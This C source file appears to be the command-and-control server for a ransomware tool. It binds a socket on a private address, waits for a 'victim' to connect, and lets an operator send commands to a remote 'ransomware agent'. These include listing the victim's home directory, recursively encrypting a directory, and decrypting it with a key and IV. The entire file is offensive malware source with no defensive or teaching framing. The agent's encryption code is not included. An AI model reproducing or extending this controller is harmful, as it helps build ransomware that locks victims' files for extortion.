#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

void usage();
int command_handler(char * command, int sockid, int client_socket);
void handleError(int sockid);

int main()
{
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    if ((sockid = socket(AF_INET, SOCK_STREAM,0))<0) 
    {
        printf("Error when creating socket\n");
        abort();
    }

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    int n, len, client_socket;
    char buffer[2048];

    if (bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr))<0)
    {
        printf("Error during binding\n");
        printf("%s", strerror(errno));
        handleError(sockid);
    }

    printf("Waiting for connection...\n");
    if (listen(sockid,1)<0)
    {
        printf("Error when listening\n");
        handleError(sockid);
    }
    len = sizeof(client_addr);
    if ((client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len))<0)
    {
        printf("Error when accepting connection\n");
        handleError(sockid);
    }

    printf("Connected to a victim\n");

    

    //n = recv(client_socket, (char *)buffer, 2048, MSG_WAITALL );
    while (1) 
    {
        char command[512];
        printf("h for help\n");
        printf("$ ");
        fgets(command,512,stdin);
        command_handler(command, sockid, client_socket);

    }   
}


void usage() 
{
    printf("h : prints help\n");
    printf("ls : list every directories of the victim's home directory\n");
    printf("enc : recursively encrypt a directory that you are in\n");
    printf("dec <key> <iv> : recursively decrypt the directory that you are in\n");
    printf("pwd : print the current working directory\n");
    printf("cd <directory> : change directory to specified directory\n");
    printf("clear : clear the terminal\n");
    printf("exit : exit the programm and close the ransomware agent\n");

}

int command_handler(char * command,int sockid, int client_socket)
{

    if (strncmp(command,"h",1) == 0 && strlen(command) == 2)
    {
        usage();
    }
    else if(strncmp(command,"ls",2) == 0 && strlen(command)==3)
    {   
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            printf("%s\n", strerror(errno));
            handleError(sockid);
        }

        printf("%s\n", buffer);
    }
    else if (strncmp(command,"enc",3) == 0 && strlen(command) == 4)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"dec",3) == 0)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"cd ",3) == 0)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"pwd",3) == 0 && strlen(command) == 4)
    {
        char buffer[2048];
        int status;
        if (send(client_socket, (const char *)command, strlen(command)+1,0)<0) 
        {
            printf("Error during sending\n");
            handleError(sockid);
        }
        status = recv(client_socket, (char *)buffer, 2048, 0 );
        if (status<=0)
        {
            printf("Connection shutdown\n");
            handleError(sockid);
        }
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"clear",5 ) == 0 && strlen(command) == 6)
    {
        system("/bin/clear"); 
    }
    else if (strncmp(command,"exit",4) == 0 && strlen(command) == 5)  
    {
        close(sockid);
        exit(0);
    }
    else if (strncmp(command, "cd", 2) ==0 && strlen(command) == 3)
    {
        printf("Usage : cd <directory>\n");
    }
    else 
    {
        printf("command not found type h for help\n");
    }

}

void handleError(int sockid)
{
    close(sockid);
    abort();
}